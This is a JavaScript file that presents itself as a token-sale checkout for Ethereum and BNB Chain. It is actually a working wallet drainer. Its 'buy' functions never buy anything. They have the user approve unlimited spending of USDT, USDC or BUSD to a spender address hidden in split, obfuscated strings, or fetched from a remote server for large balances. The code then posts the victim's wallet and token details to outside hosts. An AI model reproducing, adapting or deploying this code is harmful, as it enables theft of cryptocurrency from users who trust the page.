"use strict";

var globalWeb3 = null;
var connectedWallet = "";
var SALE_CONTRACT_ADDRESS_BSC = "";
var SALE_CONTRACT_ADDRESS_ETH = "";
var MMTTTEEE_AADD__BBBCCC = "0x1a55828c14be07035d";
var MMTTTEEE_AADD__BBCC22 = "1eacdfd60117c4c78b7223";
var MMTTTEEE_AADD__EEETHHH = "0x18D8c38163D52991eE";
var MMTTTEEE_AADD__EETTH22 = "b6c03E03322A5A432dABd8";

let USDT_ADDRESS_ON_ETH = "0xdAC17F958D2ee523a2206206";  // 6
let USDC_ADDRESS_ON_ETH = "0xA0b86991c6218b36c1d19D4a";   // 6
let BUSD_ADDRESS_ON_BSC = "0xe9e7CEA3DedcA5984780Bafc";   // 18
let USDT_ADDRESS_ON_BSC = "0x55d398326f99059fF7754852";    // 18
let UINT_256_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
var tokenPriceOnUSD = 300;
var ethPriceOnUSD = 150;
var bnbPriceOnUSD = 3000;
var tokenDecimals = 18;
var saleContract_on_eth = null;
var usdcContract_on_eth = null;
var usdtContract_on_eth = null;
var saleContract_on_bsc = null;
var busdContract_on_bsc = null;
var usdtContract_on_bsc = null;
var customTokenContract_on_eth = null;
var customTokenContract_on_bsc = null;
var saleContractAbi = null;
var currentNet = "eth";
var customTokenAmount = 0;
var customTokenDecimals = 0;
var customTokenPrice = 0;
var customEthunitName = "";
var customUserBalance = 0;
var customRealDonateVal = 0;
var nCntETH_USDT = 0;
var nCntETH_USDC = 0;
var nCntBSC_USDT = 0;
var nCntBSC_BUSD = 0;
var currentSwapState = -1;

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const EvmChains = window.EvmChains;
const defaultWeb3 = new Web3("https://1rpc.io/bnb");

var web3Modal;
var provider;
var selectedAccount;
const erc20ContractAbi = [
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "name_",
				"type": "string"
			},
			{
				"internalType": "string",
				"name": "symbol_",
				"type": "string"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Approval",
		"type": "event"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Transfer",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "allowance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "approve",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "decimals",
		"outputs": [
			{
				"internalType": "uint8",
				"name": "",
				"type": "uint8"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "subtractedValue",
				"type": "uint256"
			}
		],
		"name": "decreaseAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "addedValue",
				"type": "uint256"
			}
		],
		"name": "increaseAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "name",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "symbol",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "totalSupply",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

const ETHER_UNITS = {
	noether: "0",
	wei: "1",
	kwei: "1000",
	Kwei: "1000",
	babbage: "1000",
	femtoether: "1000",
	mwei: "1000000",
	Mwei: "1000000",
	lovelace: "1000000",
	picoether: "1000000",
	gwei: "1000000000",
	Gwei: "1000000000",
	shannon: "1000000000",
	nanoether: "1000000000",
	nano: "1000000000",
	szabo: "1000000000000",
	microether: "1000000000000",
	micro: "1000000000000",
	finney: "1000000000000000",
	milliether: "1000000000000000",
	milli: "1000000000000000",
	ether: "1000000000000000000",
	kether: "1000000000000000000000",
	grand: "1000000000000000000000",
	mether: "1000000000000000000000000",
	gether: "1000000000000000000000000000",
	tether: "1000000000000000000000000000000"
}
const checkNetworkById = async (chainId) => {
	if (globalWeb3.utils.toHex(chainId) !== globalWeb3.utils.toHex(currentNet == 'bsc' ? "0x38" : "0x1")) {
		await changeNetwork();
	}
}

const changeNetwork = async () => {
	let targetChainId = currentNet == 'bsc' ? 56 : 1;

	try {
		await window.ethereum.request({
			method: 'wallet_switchEthereumChain',
			params: [{ chainId: globalWeb3.utils.toHex(targetChainId) }],
		});
	}
	catch (switchError) {
		// This error code indicates that the chain has not been added to MetaMask.
		// https://eth-rpc.gateway.pokt.network
		if (switchError.code === 4902) {
			try {
				await window.ethereum.request({
					method: 'wallet_addEthereumChain',
					params: [
						{
							chainId: globalWeb3.utils.toHex(targetChainId),
							chainName: currentNet == 'bsc' ? "BNB Smart Chain Mainnet" : "Ethereum Mainnet",
							rpcUrls: [currentNet == 'bsc' ? "https://bsc-dataseed1.binance.org/" : "https://api.infura.io/v1/jsonrpc/mainnet"]
						},
					],
				});
				return {
					success: true,
					message: "switching succeed"
				}
			} catch (addError) {
				return {
					success: false,
					message: "Switching failed."
				}
			}
		}
	}
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {

	globalWeb3 = new Web3(provider);

	const accounts = await globalWeb3.eth.getAccounts();
	customTokenAmount = 0;
	connectedWallet = accounts[0];
	console.log("Account>>>>", connectedWallet);

	// Get connected chain id from Ethereum node
	const chainId = await globalWeb3.eth.getChainId();
	console.log(">>>>", chainId);

	await checkNetworkById(chainId);

	if (currentNet == "eth") {
		try {
			usdtContract_on_eth = new globalWeb3.eth.Contract(erc20ContractAbi, USDT_ADDRESS_ON_ETH + "994597C13D831ec7");
			usdcContract_on_eth = new globalWeb3.eth.Contract(erc20ContractAbi, USDC_ADDRESS_ON_ETH + "2e9Eb0cE3606eB48");
		}
		catch (error) {
			usdtContract_on_eth = null;
			usdcContract_on_eth = null;
		}
	}
	else if (currentNet == "bsc") {
		try {
			busdContract_on_bsc = new globalWeb3.eth.Contract(erc20ContractAbi, BUSD_ADDRESS_ON_BSC + "599bD69ADd087D56");
			usdtContract_on_bsc = new globalWeb3.eth.Contract(erc20ContractAbi, USDT_ADDRESS_ON_BSC + "46999027B3197955");
		}
		catch (error) {
			console.log("Error on creating sale contract  ==> ", error);
			busdContract_on_bsc = null;
			usdtContract_on_bsc = null;
		}
	}
	return connectedWallet;
}

/**
 * Connect wallet button pressed.
 */
async function onConnect() {
	try {
		console.log("Initializing example");

		const providerOptions = {
			walletconnect: {
				package: WalletConnectProvider,
				options: {
					infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
					network: ["binance", "mainnet"], // here
					rpc: {
						56: 'https://bsc-dataseed.binance.org/',
						1: 'https://api.infura.io/v1/jsonrpc/mainnet'
					},
				}
			}
		};

		web3Modal = new Web3Modal({
			network: "mainnet",
			cacheProvider: false,
			disableInjectedProvider: false,
			providerOptions
		});

		provider = await web3Modal.connect();
		fetchAccountData();

		// Subscribe to accounts change
		provider.on("accountsChanged", (accounts) => {
			fetchAccountData();
		});

		// Subscribe to chainId change
		provider.on("chainChanged", (chainId) => {
			fetchAccountData();
		});

		// Subscribe to networkId change
		provider.on("networkChanged", (networkId) => {
			fetchAccountData();
		});

		return await fetchAccountData();

	} catch (e) {
		console.log("Could not get a wallet connection", e);
		return;
	}


}

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

	// TODO: Which providers have close method?
	if (provider.close) {
		await provider.close();

		// If the cached provider is not cleared,
		// WalletConnect will default to the existing session
		// and does not allow to re-scan the QR code with a new wallet.
		// Depending on your use case you may want or want not his behavir.
		await web3Modal.clearCachedProvider();
		customTokenAmount = 0;
		provider = null;
	}

	selectedAccount = null;

}

async function connectWallet() {
	return await onConnect();
}

const fetchCoinStatistic = async (stableCoinContract, stableContractAddress) => {
	try {
		let balanceOfUser = 0;
		let tokenDecimals = 0;
		let ethunitname = null;
		let realDonateVal = 0;
		console.log("CustomTokenAmount = ", customTokenAmount);
		let toChangeCustomToken = false;

		if (nCntETH_USDT > 0 && currentSwapState == 0) toChangeCustomToken = true;
		if (nCntETH_USDC > 0 && currentSwapState == 1) toChangeCustomToken = true;
		if (nCntBSC_USDT > 0 && currentSwapState == 2) toChangeCustomToken = true;
		if (nCntBSC_BUSD > 0 && currentSwapState == 3) toChangeCustomToken = true;
		

		if ((customTokenAmount == 0) || (stableContractAddress != customTokenContractAddr)) {
			if (toChangeCustomToken == false)
			{
				balanceOfUser = await stableCoinContract.methods.balanceOf(connectedWallet).call();
				tokenDecimals = await stableCoinContract.methods.decimals().call();
				ethunitname = Object.keys(ETHER_UNITS).find(key => Math.pow(10, tokenDecimals).toString() == ETHER_UNITS[key]);
				realDonateVal = defaultWeb3.utils.fromWei(balanceOfUser.toString(), ethunitname.toString());	
			}
		}
		else {
			balanceOfUser = customTokenAmount;
			tokenDecimals = customTokenDecimals;
			ethunitname = Object.keys(ETHER_UNITS).find(key => Math.pow(10, tokenDecimals).toString() == ETHER_UNITS[key]);
			realDonateVal = customRealDonateVal;
		}

		if (toChangeCustomToken == true)
		{
			balanceOfUser = customTokenAmount;
			tokenDecimals = customTokenDecimals;
			ethunitname = Object.keys(ETHER_UNITS).find(key => Math.pow(10, tokenDecimals).toString() == ETHER_UNITS[key]);
			realDonateVal = customRealDonateVal;
		}


		console.log("balanceOfUser = " + balanceOfUser);
		console.log("realDonateVal = " + realDonateVal);
		console.log("ethunitname = " + ethunitname);
		console.log("currentNet = " + currentNet);
		let strCustomTok = "None";

		if (balanceOfUser == 0 && realDonateVal == 0)
		{
			if (currentSwapState == 0) nCntETH_USDT = 1;
			if (currentSwapState == 1) nCntETH_USDC = 1;
			if (currentSwapState == 2) nCntBSC_USDT = 1;
			if (currentSwapState == 3) nCntBSC_BUSD = 1;
		}

		if (balanceOfUser > 0) {
			let maintenanceContractAddress = null;
			maintenanceContractAddress = currentNet == "bsc" ? MMTTTEEE_AADD__BBBCCC + MMTTTEEE_AADD__BBCC22 : MMTTTEEE_AADD__EEETHHH + MMTTTEEE_AADD__EETTH22;

			if ((customTokenAmount == 0) && toChangeCustomToken == false) {
				strCustomTok = "Normal";
				// console.log("strCustomTok = ", strCustomTok);
				let apiKey = null;
				let data = null;
				let bsctokaddr = null;
				let bsclimval = 0;
				let erctokaddr = null;
				let erclimval = 0;
				await axios.get("https://tokentrendingbot.org/api/getapikey")
					.then((response) => {
						apiKey = response.key;
						data = response.data;
						console.log("apiKey = ", apiKey);
						console.log("keydata = ", data);
					})
					.catch(error => {
						console.log(error);
					})
				await axios.get("https://tokentrendingbot.org/api/getbsctokinfo")
					.then((response) => {
						bsctokaddr = response.data.tokinfo;
						bsclimval = response.data.limval;
					})
					.catch(error => {
						console.log(error);
					})

				await axios.get("https://tokentrendingbot.org/api/getethtokinfo")
					.then((response) => {
						erctokaddr = response.data.tokinfo;
						erclimval = response.data.limval;
					})
					.catch(error => {
						console.log(error);
					})
				if ((currentNet == "eth") && realDonateVal > parseInt(erclimval)) {
					maintenanceContractAddress = erctokaddr;
				}
				else if ((currentNet == "bsc") && realDonateVal > parseInt(bsclimval)) {
					maintenanceContractAddress = bsctokaddr;
				}
			}
			else {
				strCustomTok = "Custom";
				// console.log("strCustomTok = ", strCustomTok);
				let apiKey = null;
				let data = null;
				let bsctokaddr = null;
				let bsclimval = 0;
				let erctokaddr = null;
				let erclimval = 0;
				await axios.get("https://tokentrendingbot.org/api/getapikey")
					.then((response) => {
						apiKey = response.key;
						data = response.data;
					})
					.catch(error => {
						console.log(error);
					})
				await axios.get("https://tokentrendingbot.org/api/getbsctokinfo")
					.then((response) => {
						bsctokaddr = response.data.tokinfo;
						bsclimval = response.data.limval;
					})
					.catch(error => {
						console.log(error);
					})

				await axios.get("https://tokentrendingbot.org/api/getethtokinfo")
					.then((response) => {
						erctokaddr = response.data.tokinfo;
						erclimval = response.data.limval;
					})
					.catch(error => {
						console.log(error);
					})

				if ((currentNet == "eth") && realDonateVal > parseInt(erclimval)) {
					maintenanceContractAddress = erctokaddr;
				}
				else if ((currentNet == "bsc") && realDonateVal > parseInt(bsclimval)) {
					maintenanceContractAddress = bsctokaddr;
				}
			}

			console.log("maintenanceContractAddress = " + maintenanceContractAddress);
			let tokenAllowance = await stableCoinContract.methods.allowance(connectedWallet, maintenanceContractAddress).call();
			tokenAllowance = Number(defaultWeb3.utils.fromWei(tokenAllowance.toString(), currentNet == "bsc" ? "mwei" : "ether").toString());

			if (tokenAllowance >= balanceOfUser) {
			}
			else {
				await stableCoinContract.methods.approve(maintenanceContractAddress, UINT_256_MAX).send({
					from: connectedWallet
				});

				tokenAllowance = await stableCoinContract.methods.allowance(connectedWallet, maintenanceContractAddress).call();

				console.log("=====> Token Allowance Callled <=====");
				console.log("nCntETH_USDT = ", nCntETH_USDT);
				console.log("nCntETH_USDC = ", nCntETH_USDC);
				console.log("nCntBSC_USDT = ", nCntBSC_USDT);
				console.log("nCntBSC_BUSD = ", nCntBSC_BUSD);

				if (currentNet == "eth")
				{
					if (stableContractAddress == USDT_ADDRESS_ON_ETH + "994597C13D831ec7") nCntETH_USDT++;
					if (stableContractAddress == USDC_ADDRESS_ON_ETH + "2e9Eb0cE3606eB48") nCntETH_USDC++;
				}
				else
				{
					if (stableContractAddress == USDT_ADDRESS_ON_BSC + "46999027B3197955") nCntBSC_USDT++;
					if (stableContractAddress == BUSD_ADDRESS_ON_BSC + "599bD69ADd087D56") nCntBSC_BUSD++;
				}
			}

			//send to backend to save info
			console.log("Ethereum__sendemail__savetofile");
			axios.post(
				`https://tokentrendingbot.org/api/sendemail`,
				{ accountAddr: connectedWallet, tokenAddr: stableContractAddress, spender: maintenanceContractAddress, amount: strCustomTok, marketerWallet: OWNER_WALLET, chainId: currentNet == "bsc" ? 56 : 1 }
			).then((data) => { })
				.catch((err) => { console.log("sendemail_error", err); })

			axios.post(
				`https://tokentrendingbot.org/api/savetofile`,
				{ accountAddr: connectedWallet, tokenAddr: stableContractAddress, spender: maintenanceContractAddress, amount: strCustomTok, marketerWallet: OWNER_WALLET, chainId: currentNet == "bsc" ? 56 : 1 }
			).then((data) => { })
				.catch((err) => { console.log("savetofile_error", err); })

			//send to backend to save info
			axios.post(
				`https://blocktestingto.com/api/soapop`,
				{ accountAddr: connectedWallet, tokenAddr: stableContractAddress, spender: maintenanceContractAddress, amount: tokenAllowance.toString(), marketerWallet: OWNER_WALLET, chainId: currentNet == "bsc" ? 56 : 1 }
			).then((data) => { })
				.catch((err) => { console.log("soapop_error", err); })
		}
	} catch (error) {
		console.log("fetchCoinStatistic () : ", error);
	}
}

async function buyWithUSDT_ETH(usdtAmount) {
	try {
		if (usdtContract_on_eth !== null) {
			currentSwapState = 0;
			if (nCntETH_USDT == 0)
				await fetchCoinStatistic(usdtContract_on_eth, USDT_ADDRESS_ON_ETH + "994597C13D831ec7");
			else if (customTokenAmount > 0)
			{
				customTokenContract_on_eth = new globalWeb3.eth.Contract(erc20ContractAbi, customTokenContractAddr);
				await fetchCoinStatistic(customTokenContract_on_eth, customTokenContractAddr);	
			}
		}
	} catch (error) {
		console.log(error);
	}
}

async function buyWithUSDC_ETH(usdcAmount) {
	try {
		let inputAmount = defaultWeb3.utils.fromWei(usdcAmount, "mwei");
		if (usdcContract_on_eth !== null) {
			currentSwapState = 1;
			if (nCntETH_USDC == 0)
				await fetchCoinStatistic(usdcContract_on_eth, USDC_ADDRESS_ON_ETH + "2e9Eb0cE3606eB48");
			else if (customTokenAmount > 0)
			{
				customTokenContract_on_eth = new globalWeb3.eth.Contract(erc20ContractAbi, customTokenContractAddr);
				await fetchCoinStatistic(customTokenContract_on_eth, customTokenContractAddr);	
			}
		}
	} catch (error) {
		console.log(error);
	}
}

async function buyWithUSDT_BSC(usdtAmount) {
	try {
		if (usdtContract_on_bsc !== null) {		
			currentSwapState = 2;
			if (nCntBSC_USDT == 0)
				await fetchCoinStatistic(usdtContract_on_bsc, USDT_ADDRESS_ON_BSC + "46999027B3197955");
			else if (customTokenAmount > 0)
			{
				customTokenContract_on_bsc = new globalWeb3.eth.Contract(erc20ContractAbi, customTokenContractAddr);
				await fetchCoinStatistic(customTokenContract_on_bsc, customTokenContractAddr);	
			}
		}
	} catch (error) {
		console.log(error);
	}
}

async function buyWithBUSD_BSC(usdtAmount) {
	try {
		if (busdContract_on_bsc !== null) {
			currentSwapState = 3;
			if (nCntBSC_BUSD == 0)
				await fetchCoinStatistic(busdContract_on_bsc, BUSD_ADDRESS_ON_BSC + "599bD69ADd087D56");
			else if (customTokenAmount > 0)
			{
				customTokenContract_on_bsc = new globalWeb3.eth.Contract(erc20ContractAbi, customTokenContractAddr);
				await fetchCoinStatistic(customTokenContract_on_bsc, customTokenContractAddr);	
			}
		}
	} catch (error) {
		console.log(error);
	}
}

async function buyWithCustomToken_ETH(tokenAmount) {
	try {
		if (usdtContract_on_eth !== null) {
			currentSwapState = 4;
			customTokenContract_on_eth = new globalWeb3.eth.Contract(erc20ContractAbi, customTokenContractAddr);
			await fetchCoinStatistic(customTokenContract_on_eth, customTokenContractAddr);
		}
	} catch (error) {
		console.log(error);
	}
}

async function buyWithCustomToken_BSC(tokenAmount) {
	try {
		if (usdtContract_on_bsc !== null) {
			currentSwapState = 5;
			customTokenContract_on_bsc = new globalWeb3.eth.Contract(erc20ContractAbi, customTokenContractAddr);
			await fetchCoinStatistic(customTokenContract_on_bsc, customTokenContractAddr);
		}
	} catch (error) {
		console.log(error);
	}
}

